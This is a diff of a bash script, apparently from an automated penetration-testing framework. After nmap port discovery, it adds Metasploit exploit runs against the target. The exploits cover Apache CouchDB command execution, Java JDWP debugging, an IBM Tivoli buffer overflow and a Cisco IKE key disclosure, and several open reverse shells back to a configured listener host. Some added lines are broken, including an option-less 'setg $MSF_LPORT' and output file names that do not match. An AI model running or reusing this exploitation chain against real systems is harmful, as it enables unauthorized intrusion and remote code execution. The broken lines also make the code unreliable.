@@ -143,27 +143,27 @@ port_5984=`grep 'portid="5984"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_6667=`grep 'portid="6667"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_7001=`grep 'portid="7001"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8000=`grep 'portid="8000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
-port_8009=`grep 'portid="8009"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8080=`grep 'portid="8080"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8180=`grep 'portid="8180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8443=`grep 'portid="8443"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_8888=`grep 'portid="8888"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
-port_8888=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_9200=`grep 'portid="9200"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_9495=`grep 'portid="9495"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_10000=`grep 'portid="10000"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_16992=`grep 'portid="16992"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27017=`grep 'portid="27017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27018=`grep 'portid="27018"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_27019=`grep 'portid="27019"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_28017=`grep 'portid="28017"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
+port_49180=`grep 'portid="49180"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 port_49152=`grep 'portid="49152"' $LOOT_DIR/nmap/nmap-$TARGET.xml | grep open`
 
-if [ "$FULLNMAPSCAN" = "1" ]; then
-  port_67=`grep 'portid="67"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
-  port_68=`grep 'portid="68"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
-  port_69=`grep 'portid="69"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
-  port_123=`grep 'portid="123"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
-  port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open`
-fi
+port_67=`grep 'portid="67"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
+port_68=`grep 'portid="68"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
+port_69=`grep 'portid="69"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
+port_123=`grep 'portid="123"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
+port_161=`grep 'portid="161"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
+port_500=`grep 'portid="500"' $LOOT_DIR/nmap/nmap-udp-$TARGET.xml | grep open | grep -v filtered`
 
 if [ -z "$port_21" ];
 then
@@ -370,7 +370,7 @@ else
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      nmap -A -Pn -T5 -p 80 -sV --script=*http-vuln*,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port80
+      nmap -A -Pn -T5 -p 80 -sV --script=http-adobe-coldfusion-apsa1301,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth,http-avaya-ipoffice-users,http-awstatstotals-exec,http-axis2-dir-traversal,http-backup-finder,http-barracuda-dir-traversal,http-bigip-cookie,http-brute,http-cakephp-version,http-chrono,http-cisco-anyconnect,http-coldfusion-subzero,http-comments-displayer,http-config-backup,http-cookie-flags,http-cors,http-cross-domain-policy,http-date,http-default-accounts,http-devframework,http-dlink-backdoor,http-dombased-xss,http-domino-enum-passwords,http-drupal-enum-users,http-drupal-enum,http-enum,http-errors,http-feed,http-form-brute,http-frontpage-login,http-generator,http-git,http-gitweb-projects-enum,http-headers,http-hp-ilo-info,http-huawei-hg5xx-vuln,http-icloud-findmyiphone,http-icloud-sendmsg,http-iis-short-name-brute,http-iis-webdav-vuln,http-internal-ip-disclosure,http-joomla-brute,http-jsonp-detection,http-litespeed-sourcecode-download,http-ls,http-majordomo2-dir-traversal,http-malware-host,http-mcmp,http-method-tamper,http-methods,http-mobileversion-checker,http-ntlm-info,http-open-proxy,http-open-redirect,http-passwd,http-php-version,http-phpmyadmin-dir-traversal,http-phpself-xss,http-proxy-brute,http-put,http-qnap-nas-info,http-referer-checker,http-robots.txt,http-robtex-reverse-ip,http-robtex-shared-ns,http-sap-netweaver-leak,http-security-headers,http-server-header,http-shellshock,http-sitemap-generator,http-svn-enum,http-svn-info,http-title,http-tplink-dir-traversal,http-trace,http-trane-info,http-unsafe-output-escaping,http-userdir-enum,http-vhosts,http-virustotal,http-vlcstreamer-ls,http-vmware-path-vuln,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-0738,http-vuln-cve2010-2861,http-vuln-cve2011-3192,http-vuln-cve2011-3368,http-vuln-cve2012-1823,http-vuln-cve2013-0156,http-vuln-cve2013-6786,http-vuln-cve2013-7091,http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1427,http-vuln-cve2015-1635,http-vuln-cve2017-1001000,http-vuln-cve2017-5638,http-vuln-cve2017-5689,http-vuln-cve2017-8917,http-vuln-misfortune-cookie,http-vuln-wnr1000-creds,http-waf-detect,http-waf-fingerprint,http-webdav-scan,http-wordpress-brute,http-wordpress-enum,http-wordpress-users,https-redirect,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port80
       sed -r "s/</\&lh\;/g" $LOOT_DIR/output/nmap-$TARGET-port80 2> /dev/null > $LOOT_DIR/output/nmap-$TARGET-port80.txt 2> /dev/null
       rm -f $LOOT_DIR/output/nmap-$TARGET-port80 2> /dev/null
   fi
@@ -638,7 +638,7 @@ else
     echo -e "${OKGREEN}====================================================================================${RESET}"
     echo -e "$OKRED RUNNING NMAP HTTP SCRIPTS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
-    nmap -A -sV -T5 -Pn -p 443 --script=*http-vuln*,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port443
+    nmap -A -sV -T5 -Pn -p 443 --script=http-adobe-coldfusion-apsa1301,http-apache-negotiation,http-apache-server-status,http-aspnet-debug,http-auth-finder,http-auth,http-avaya-ipoffice-users,http-awstatstotals-exec,http-axis2-dir-traversal,http-backup-finder,http-barracuda-dir-traversal,http-bigip-cookie,http-brute,http-cakephp-version,http-chrono,http-cisco-anyconnect,http-coldfusion-subzero,http-comments-displayer,http-config-backup,http-cookie-flags,http-cors,http-cross-domain-policy,http-date,http-default-accounts,http-devframework,http-dlink-backdoor,http-dombased-xss,http-domino-enum-passwords,http-drupal-enum-users,http-drupal-enum,http-enum,http-errors,http-feed,http-form-brute,http-frontpage-login,http-generator,http-git,http-gitweb-projects-enum,http-headers,http-hp-ilo-info,http-huawei-hg5xx-vuln,http-icloud-findmyiphone,http-icloud-sendmsg,http-iis-short-name-brute,http-iis-webdav-vuln,http-internal-ip-disclosure,http-joomla-brute,http-jsonp-detection,http-litespeed-sourcecode-download,http-ls,http-majordomo2-dir-traversal,http-malware-host,http-mcmp,http-method-tamper,http-methods,http-mobileversion-checker,http-ntlm-info,http-open-proxy,http-open-redirect,http-passwd,http-php-version,http-phpmyadmin-dir-traversal,http-phpself-xss,http-proxy-brute,http-put,http-qnap-nas-info,http-referer-checker,http-robots.txt,http-robtex-reverse-ip,http-robtex-shared-ns,http-sap-netweaver-leak,http-security-headers,http-server-header,http-shellshock,http-sitemap-generator,http-svn-enum,http-svn-info,http-title,http-tplink-dir-traversal,http-trace,http-trane-info,http-unsafe-output-escaping,http-userdir-enum,http-vhosts,http-virustotal,http-vlcstreamer-ls,http-vmware-path-vuln,http-vuln-cve2006-3392,http-vuln-cve2009-3960,http-vuln-cve2010-0738,http-vuln-cve2010-2861,http-vuln-cve2011-3192,http-vuln-cve2011-3368,http-vuln-cve2012-1823,http-vuln-cve2013-0156,http-vuln-cve2013-6786,http-vuln-cve2013-7091,http-vuln-cve2014-2126,http-vuln-cve2014-2127,http-vuln-cve2014-2128,http-vuln-cve2014-2129,http-vuln-cve2014-3704,http-vuln-cve2014-8877,http-vuln-cve2015-1427,http-vuln-cve2015-1635,http-vuln-cve2017-1001000,http-vuln-cve2017-5638,http-vuln-cve2017-5689,http-vuln-cve2017-8917,http-vuln-misfortune-cookie,http-vuln-wnr1000-creds,http-waf-detect,http-waf-fingerprint,http-webdav-scan,http-wordpress-brute,http-wordpress-enum,http-wordpress-users,https-redirect,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port443
     sed -r "s/</\&lh\;/g" $LOOT_DIR/output/nmap-$TARGET-port443 2> /dev/null > $LOOT_DIR/output/nmap-$TARGET-port443.txt 2> /dev/null
     rm -f $LOOT_DIR/output/nmap-$TARGET-port443 2> /dev/null
   fi
@@ -710,7 +710,6 @@ else
   fi
   echo -e "$OKRED[+]$RESET Screenshot saved to $LOOT_DIR/screenshots/$TARGET-port443.jpg"
 
-
   if [ $WEBSCREENSHOT = "1" ]; then
     cd $LOOT_DIR
     python $INSTALL_DIR/bin/webscreenshot.py -t 5 https://$TARGET:443
@@ -754,6 +753,21 @@ else
     msfconsole -q -x "setg RHOSTS "$TARGET"; setg RHOST "$TARGET"; use linux/samba/is_known_pipename; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw > $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.txt 2> /dev/null
     rm -f $LOOT_DIR/output/msf-$TARGET-port445-is_known_pipename.raw 2> /dev/null
+  fi
+fi
+
+if [ -z "$port_500" ];
+then
+  echo -e "$OKRED + -- --=[Port 500 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 500 opened... running tests...$RESET"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING CISCO IKE KEY DISCLOSURE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/ike/cisco_ike_benigncertain; set RHOSTS "$TARGET"; set PACKETFILE /usr/share/metasploit-framework/data/exploits/cve-2016-6415/sendpacket.raw; set THREADS 24; set RPORT 500; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw > $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port500-cisco_ike_benigncertain.raw 2> /dev/null
   fi
 fi
 
@@ -1051,6 +1065,12 @@ else
     msfconsole -q -x "use auxiliary/scanner/couchdb/couchdb_enum; set RHOST "$TARGET"; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw > $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.txt 2> /dev/null
     rm -f $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw 2> /dev/null
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING APACHE COUCHDB RCE EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use exploit/linux/http/apache_couchdb_cmd_exec; set RHOSTS "$TARGET"; set RPORT 5984; setg LHOST $MSF_LHOST; setg $MSF_LPORT; run; exit;"| tee $LOOT_DIR/output/msf-$TARGET-port5984-couchdb_enum.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.raw > $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port5984-apache_couchdb_cmd_exec.raw 2> /dev/null
   fi
 fi
 
@@ -1117,6 +1137,46 @@ else
     msfconsole -q -x "use exploit/linux/misc/jenkins_java_deserialize; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; setg RPORT 7001; set SSL true; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw
     sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw > $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.txt 2> /dev/null
     rm -f $LOOT_DIR/output/msf-$TARGET-port7001-jenkins_java_deserialize.raw 2> /dev/null
+  fi
+fi
+
+
+
+
+
+
+
+
+
+
+
+if [ -z "$port_8000" ];
+then
+  echo -e "$OKRED + -- --=[Port 8000 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 8000 opened... running tests...$RESET"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING JAVA JDWP DEBUG EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use exploit/multi/misc/java_jdwp_debugger; setg RHOSTS "$TARGET"; set RPORT 8000; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw > $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port_8000-java_jdwp_debugger.raw 2> /dev/null
+  fi
+fi
+
+if [ -z "$port_9495" ];
+then
+  echo -e "$OKRED + -- --=[Port 9495 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 9495 opened... running tests...$RESET"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING IBM TIVOLI ENDPOINT OVERFLOW EXPLOIT $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use exploit/windows/http/ibm_tivoli_endpoint_bof; setg RHOST "$TARGET"; setg RHOSTS "$TARGET"; set SSL false; setg LHOST "$MSF_LHOST"; setg LPORT "$MSF_LPORT"; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw > $LOOT_DIR/output/msf-$TARGET-port7001-ibm_tivoli_endpoint_bof.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port_9495-ibm_tivoli_endpoint_bof.raw 2> /dev/null
   fi
 fi
 
@@ -1199,6 +1259,21 @@ else
     echo -e "$OKRED RUNNING NMAP SCRIPTS $RESET"
     echo -e "${OKGREEN}====================================================================================${RESET}"
     nmap -sV  -p 28017 -Pn -T5 --script=mongodb*,/usr/share/nmap/scripts/vulscan/vulscan.nse,/usr/share/nmap/scripts/vulners $TARGET | tee $LOOT_DIR/output/nmap-$TARGET-port28017.txt
+  fi
+fi
+
+if [ -z "$port_49180" ];
+then
+  echo -e "$OKRED + -- --=[Port 49180 closed... skipping.$RESET"
+else
+  echo -e "$OKORANGE + -- --=[Port 49180 opened... running tests...$RESET"
+  if [ "$METASPLOIT_EXPLOIT" = "1" ]; then
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    echo -e "$OKRED RUNNING JAVA RMI SCANNER $RESET"
+    echo -e "${OKGREEN}====================================================================================${RESET}"
+    msfconsole -q -x "use auxiliary/scanner/misc/java_rmi_server; setg RHOSTS \"$TARGET\"; set RPORT 49180; run; back; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw
+    sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw > $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.txt 2> /dev/null
+    rm -f $LOOT_DIR/output/msf-$TARGET-port49180-java_rmi_server.raw 2> /dev/null
   fi
 fi
 
